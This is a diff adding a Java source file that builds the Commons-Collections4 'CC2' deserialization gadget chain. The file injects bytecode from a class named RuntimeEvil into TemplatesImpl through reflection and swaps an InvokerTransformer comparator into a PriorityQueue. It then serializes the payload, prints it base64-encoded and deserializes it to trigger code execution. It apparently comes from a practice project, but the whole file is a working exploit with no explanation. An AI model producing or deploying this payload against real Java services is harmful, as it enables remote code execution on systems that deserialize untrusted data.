@@ -1,0 +1,62 @@
+package org.example;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.PriorityQueue;
+
+public class CC2noarray {
+    public static void main(String[] args) throws Exception{
+        byte[] code1 = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\RuntimeEvil.class"));
+        TemplatesImpl templatesClass = new TemplatesImpl();
+        Field[] fields = templatesClass.getClass().getDeclaredFields();
+        for (Field field : fields) {
+            field.setAccessible(true);
+            if (field.getName().equals("_bytecodes")) {
+                field.set(templatesClass, new byte[][]{code1});
+            } else if (field.getName().equals("_name")) {
+                field.set(templatesClass, "godown");
+            } else if (field.getName().equals("_tfactory")) {
+                field.set(templatesClass, new TransformerFactoryImpl());
+            }
+        }
+        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", new Class[0], new Object[0]);
+        TransformingComparator transformingComparator = new TransformingComparator<>(invokerTransformer,null);
+        PriorityQueue<Object> priorityQueue = new PriorityQueue<>(1,new TransformingComparator<>(new ConstantTransformer<>(1)));
+        priorityQueue.add(templatesClass);
+        priorityQueue.add(templatesClass);
+        Field compareField = PriorityQueue.class.getDeclaredField("comparator");
+        compareField.setAccessible(true);
+        compareField.set(priorityQueue,transformingComparator);
+        serialize(priorityQueue);
+        System.out.println(base64encode(Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\Idea_java_ProTest\\Test\\ser.bin"))));
+        unserialize("ser.bin");
+    }
+    public static void serialize(Object obj) throws Exception {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
+        oos.writeObject(obj);
+        oos.close();
+    }
+    public static String base64encode(byte[] bytes) throws Exception
+    {
+        Class<?> base64 = Class.forName("java.util.Base64");
+        Object Encoder = base64.getMethod("getEncoder").invoke(null);
+        return (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder,bytes);
+    }
+    public static Object unserialize(String filename) throws Exception {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
+        Object obj = ois.readObject();
+        ois.close();
+        return obj;
+    }
+}
